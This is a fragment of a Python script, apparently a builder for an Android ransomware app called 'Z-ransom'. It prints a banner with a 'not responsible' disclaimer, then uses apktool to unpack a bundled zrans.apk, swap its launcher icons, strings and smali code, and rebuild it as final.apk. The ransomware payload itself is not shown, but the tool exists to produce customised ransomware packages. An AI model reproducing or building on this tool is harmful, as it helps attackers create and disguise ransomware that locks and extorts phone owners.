...
def banner():
 ...
 print(w+d+"⠀G^!P&@@@@Y       !@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
 print(w+d+"⠀B&@@@@@@@5      ^&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
 print(w+d+"⠀@@@@@@@#7      .B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"+w+b+"Z-ransom Caro Nero")
 print(w+d+"⠀@@@@@@Y.       -----------------------------------"+w+"The author is not responsible")
 print(w+d+"⠀@@@@G^        ------------------------------------")
 print(w+d+"⠀@@#7         -------------------------------------")
 print(w+d+"⠀@Y.         --------------------------------------")
 print(w+d+"⠀~           ::           :------------------------")
...
def start():
    ...
    print(w+"-"*43+d)
    os.system("apktool d zrans.apk")
    imgpath = [
        "zrans/res/drawable-mdpi-v4/ic_launcher.png",
        "zrans/res/drawable-xhdpi-v4/ic_launcher.png",
        "zrans/res/drawable-hdpi-v4/ic_launcher.png",
        "zrans/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "zrans/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L zrans/ -name '*0000.smali'","r").readline().strip()
    ...
    os.system("apktool b zrans -o final.apk;rm -rf zrans")
